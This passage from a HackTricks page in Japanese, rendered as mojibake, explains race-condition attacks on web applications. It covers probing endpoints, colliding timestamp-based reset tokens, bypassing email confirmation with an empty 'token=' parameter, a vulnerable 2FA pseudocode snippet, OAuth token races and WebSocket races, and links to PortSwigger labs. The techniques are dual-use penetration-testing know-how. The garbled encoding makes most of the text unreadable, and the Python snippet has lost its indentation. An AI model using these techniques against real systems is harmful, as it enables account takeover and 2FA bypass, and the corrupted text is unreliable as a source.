* **ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸**: ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®æ°¸ç¶šãƒ‡ãƒ¼ã‚¿ã‚’æ“ä½œã™ã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒ‡ãƒ¼ã‚¿ã‚’å‡¦ç†ã™ã‚‹ã‚‚ã®ã‚ˆã‚Šã‚‚å„ªå…ˆã—ã¾ã™ã€‚
* **ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**: æ—¢å­˜ã®ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã™ã‚‹æ“ä½œã‚’æ¢ã—ã€æ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ã‚’è¿½åŠ ã™ã‚‹æ“ä½œã‚ˆã‚Šã‚‚æ”»æ’ƒå¯èƒ½ãªçŠ¶æ³ã‚’ä½œã‚Šã‚„ã™ã„ã¨è€ƒãˆã¾ã™ã€‚
* **ã‚­ãƒ¼ä»˜ã‘**: æˆåŠŸã—ãŸæ”»æ’ƒã¯é€šå¸¸ã€åŒã˜è­˜åˆ¥å­ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ãªã©ï¼‰ã«ã‚­ãƒ¼ä»˜ã‘ã•ã‚ŒãŸæ“ä½œã‚’å«ã¿ã¾ã™ã€‚
2. **åˆæœŸã®æ¢æŸ»ã‚’å®Ÿæ–½ã™ã‚‹**
* ç‰¹å®šã•ã‚ŒãŸã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ç«¶åˆçŠ¶æ…‹æ”»æ’ƒã§ãƒ†ã‚¹ãƒˆã—ã€äºˆæƒ³ã•ã‚Œã‚‹çµæœã‹ã‚‰ã®é€¸è„±ã‚’è¦³å¯Ÿã—ã¾ã™ã€‚äºˆæœŸã—ãªã„å¿œç­”ã‚„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æŒ¯ã‚‹èˆã„ã®å¤‰åŒ–ã¯è„†å¼±æ€§ã‚’ç¤ºã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
3. **è„†å¼±æ€§ã‚’ãƒ‡ãƒ¢ãƒ³ã‚¹ãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹**
* è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æœ€å°æ•°ã«çµã‚Šè¾¼ã¿ã¾ã™ã€‚é€šå¸¸ã€2ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã ã‘ã§è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚¹ãƒ†ãƒƒãƒ—ã§ã¯ã€æ­£ç¢ºãªã‚¿ã‚¤ãƒŸãƒ³ã‚°ãŒå¿…è¦ãªãŸã‚ã€è¤‡æ•°ã®è©¦è¡Œã‚„è‡ªå‹•åŒ–ãŒå¿…è¦ãªå ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### Time Sensitive Attacks

ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’æ­£ç¢ºã«ã™ã‚‹ã“ã¨ã§ã€äºˆæ¸¬å¯èƒ½ãªæ–¹æ³•ï¼ˆã‚¿ã‚¤ãƒ ã‚¹ã‚¿ãƒ³ãƒ—ãªã©ï¼‰ãŒã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒˆãƒ¼ã‚¯ãƒ³ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã«è„†å¼±æ€§ãŒæ˜ã‚‰ã‹ã«ãªã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ã€ã‚¿ã‚¤ãƒ ã‚¹ã‚¿ãƒ³ãƒ—ã«åŸºã¥ã„ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã¨ã€åŒæ™‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«å¯¾ã—ã¦åŒä¸€ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¨±å¯ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**æ‚ªç”¨ã™ã‚‹ã«ã¯:**

* åŒæ™‚ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ãŸã‚ã«ã€å˜ä¸€ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒã®ã‚ˆã†ãªæ­£ç¢ºãªã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚åŒä¸€ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯è„†å¼±æ€§ã‚’ç¤ºã—ã¾ã™ã€‚

**ä¾‹:**

* åŒæ™‚ã«2ã¤ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒªã‚»ãƒƒãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã—ã€ãã‚Œã‚‰ã‚’æ¯”è¼ƒã—ã¾ã™ã€‚ä¸€è‡´ã™ã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã¯ãƒˆãƒ¼ã‚¯ãƒ³ç”Ÿæˆã«æ¬ é™¥ãŒã‚ã‚‹ã“ã¨ã‚’ç¤ºå”†ã—ã¾ã™ã€‚

**ã“ã‚Œã‚’è©¦ã™ãŸã‚ã«**[**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**

## Hidden substates case studies

### Pay & add an Item

**æ”¯æ‰•ã„**ã‚’è¡Œã„ã€**è¿½åŠ ã®ã‚¢ã‚¤ãƒ†ãƒ **ã‚’è¿½åŠ ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã‚‹ã«ã¯ã€[**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚ã“ã®è¿½åŠ ã‚¢ã‚¤ãƒ†ãƒ ã«ã¯æ”¯æ‰•ã„ãŒå¿…è¦ãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### Confirm other emails

**æ–°ã—ã„ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«å¤‰æ›´ã—ã¦åŒæ™‚ã«ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç¢ºèª**ã™ã‚‹ã“ã¨ã§ã€ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ãŒæ–°ã—ã„ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç¢ºèªã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚

### Change email to 2 emails addresses Cookie based

[**ã“ã®ç ”ç©¶**](https://portswigger.net/research/smashing-the-state-machine)ã«ã‚ˆã‚‹ã¨ã€Gitlabã¯ã“ã®æ–¹æ³•ã§ä¹—ã£å–ã‚Šã®è„†å¼±æ€§ãŒã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€**1ã¤ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ãƒ¡ãƒ¼ãƒ«ç¢ºèªãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä»–ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«é€ä¿¡**ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã‚‰ã§ã™ã€‚

**ã“ã‚Œã‚’è©¦ã™ãŸã‚ã«**[**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**

### Hidden Database states / Confirmation Bypass

**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æƒ…å ±ã‚’è¿½åŠ ã™ã‚‹ãŸã‚ã«2ã¤ã®ç•°ãªã‚‹æ›¸ãè¾¼ã¿**ãŒä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã¯æœ€åˆã®ãƒ‡ãƒ¼ã‚¿ã®ã¿ãŒæ›¸ãè¾¼ã¾ã‚ŒãŸçŠ¶æ…‹**ãŒä¸€æ™‚çš„ã«å­˜åœ¨ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹éš›ã«ã¯**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã¨**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãŒ**æ›¸ãè¾¼ã¾ã‚Œ**ã€ãã®å¾Œã«æ–°ã—ãä½œæˆã•ã‚ŒãŸã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®**ãƒˆãƒ¼ã‚¯ãƒ³**ãŒæ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€ä¸€æ™‚çš„ã«**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç¢ºèªã™ã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ãŒnull**ã§ã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç™»éŒ²ã—ã€ç©ºã®ãƒˆãƒ¼ã‚¯ãƒ³** (`token=`ã¾ãŸã¯`token[]=`ã¾ãŸã¯ãã®ä»–ã®ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³) **ã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ã™ãã«ç¢ºèªã™ã‚‹ãŸã‚ã«è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡**ã™ã‚‹ã“ã¨ã§ã€ãƒ¡ãƒ¼ãƒ«ã‚’åˆ¶å¾¡ã—ã¦ã„ãªã„ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç¢ºèªã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**ã“ã‚Œã‚’è©¦ã™ãŸã‚ã«**[**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚**

### Bypass 2FA

æ¬¡ã®ç–‘ä¼¼ã‚³ãƒ¼ãƒ‰ã¯ã€**2FAãŒå¼·åˆ¶ã•ã‚Œã¦ã„ãªã„**çŠ¶æ…‹ã§ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒä½œæˆã•ã‚Œã‚‹ãŸã‚ã€ç«¶åˆçŠ¶æ…‹ã«è„†å¼±æ€§ãŒã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2æ°¸ç¶šæ€§

ã„ãã¤ã‹ã®[**OAuthãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers)ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ãŒç™»éŒ²ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã—ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã—ã¦èªè¨¼ã§ãã¾ã™ã€‚ãã®ãŸã‚ã«ã¯ã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ**ã¯**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
ã—ãŸãŒã£ã¦ã€ã“ã“ã¾ã§ã¯ã€Google/LinkedIn/GitHubãªã©ã®ä¸€èˆ¬çš„ãªãƒ­ã‚°ã‚¤ãƒ³ã§ã€æ¬¡ã®ã‚ˆã†ãªãƒšãƒ¼ã‚¸ãŒè¡¨ç¤ºã•ã‚Œã¾ã™: "_ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³\<InsertCoolName>ãŒã‚ãªãŸã®æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’å¸Œæœ›ã—ã¦ã„ã¾ã™ã€‚è¨±å¯ã—ã¾ã™ã‹ï¼Ÿ_"

#### `authorization_code`ã«ãŠã‘ã‚‹ç«¶åˆçŠ¶æ…‹

**å•é¡Œ**ã¯ã€**ãã‚Œã‚’å—ã‘å…¥ã‚Œ**ã€è‡ªå‹•çš„ã«**`authorization_code`**ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«é€ä¿¡ã™ã‚‹ã¨ç™ºç”Ÿã—ã¾ã™ã€‚ãã®å¾Œã€ã“ã®**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯OAuthã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼å†…ã®ç«¶åˆçŠ¶æ…‹ã‚’æ‚ªç”¨ã—ã¦ã€`authorization_code`ã‹ã‚‰AT/RTï¼ˆ_èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³/ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³_ï¼‰ã‚’è¤‡æ•°ç”Ÿæˆ**ã—ã¾ã™ã€‚åŸºæœ¬çš„ã«ã€ã‚ãªãŸãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ãŸã“ã¨ã‚’æ‚ªç”¨ã—ã¦**è¤‡æ•°ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆ**ã—ã¾ã™ã€‚ãã®å¾Œã€**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ‡ãƒ¼ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’åœæ­¢ã™ã‚‹ã¨ã€1çµ„ã®AT/RTãŒå‰Šé™¤ã•ã‚Œã¾ã™ãŒã€ä»–ã®ã‚‚ã®ã¯æœ‰åŠ¹ã®ã¾ã¾**ã§ã™ã€‚

#### `Refresh Token`ã«ãŠã‘ã‚‹ç«¶åˆçŠ¶æ…‹

**æœ‰åŠ¹ãªRTã‚’å–å¾—**ã—ãŸå¾Œã€ãã‚Œã‚’æ‚ªç”¨ã—ã¦**è¤‡æ•°ã®AT/RTã‚’ç”Ÿæˆ**ã—ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ‡ãƒ¼ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’å–ã‚Šæ¶ˆã—ã¦ã‚‚ã€è¤‡æ•°ã®RTãŒæœ‰åŠ¹ã®ã¾ã¾**ã«ãªã‚Šã¾ã™ã€‚

## **WebSocketsã«ãŠã‘ã‚‹RC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC)ã§ã¯ã€**Webã‚½ã‚±ãƒƒãƒˆã§ã‚‚ç«¶åˆçŠ¶æ…‹ã‚’æ‚ªç”¨ã™ã‚‹**ãŸã‚ã«**ä¸¦åˆ—**ã§ã‚¦ã‚§ãƒ–ã‚½ã‚±ãƒƒãƒˆãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹Javaã®PoCãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>!</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã‚Šã™ã‚‹ã«ã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰**ãŠã‚ˆã³**è‡ªå‹•åŒ–**ã§ãã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã ã•ã„:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
